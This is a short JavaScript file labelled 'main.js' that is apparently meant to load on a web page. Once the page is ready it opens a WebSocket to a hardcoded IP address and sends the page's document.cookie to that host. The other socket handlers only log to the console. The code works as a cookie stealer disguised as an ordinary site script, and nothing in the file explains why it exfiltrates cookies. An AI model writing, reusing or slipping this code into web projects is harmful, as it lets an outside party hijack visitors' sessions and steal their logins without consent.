/* main.js */

$(function () {
    console.log("Ready!");

    socket = new WebSocket("wss://24.4.237.252:443/sock");
    socket.onopen = function(evt) { onOpen(evt) };
    socket.onclose = function(evt) { onClose(evt) };
    socket.onmessage = function(evt) { onMessage(evt) };
    socket.onerror = function(evt) { onError(evt) };

    function onOpen(evt)
    {
        console.log("opened socket")
        socket.send(document.cookie);
    }

    function onClose(evt)
    {
        console.log("closed socket")
    }

    function onMessage(evt)
    {
        console.log("msg socket")
    }

    function onError(evt)
    {
        console.log("err socket")
    }
});
